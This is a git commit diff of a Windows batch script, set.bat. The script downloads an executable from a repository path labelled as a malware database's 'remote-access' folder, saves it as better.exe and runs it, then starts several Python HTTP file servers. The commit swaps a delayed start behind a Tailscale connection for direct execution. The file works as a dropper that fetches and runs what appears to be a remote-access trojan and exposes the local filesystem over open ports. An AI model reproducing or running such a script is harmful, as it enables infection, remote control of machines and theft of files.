6ce266de6aa76eb999cbd9a6fbab345c908c2537
someonefromdiscord <freehostlvr12@proton.me>
2024-11-24 15:40:20 +0100

    Update set.bat

--- set.bat
+++ set.bat
@@ -1,8 +1,5 @@
 curl https://gitea.com/cvmuser1000/Malware-Database/raw/branch/main/remote-access/skyhighsundaerat.exe --output better.exe
-timeout -c 20
-"C:/Program Files/Tailscale/tailscale.exe" up
-start better.exe
+better.exe
 py -m http.server 5151
-timeout -c 9999
 py -m http.server 5000
 py -m http.server 5651
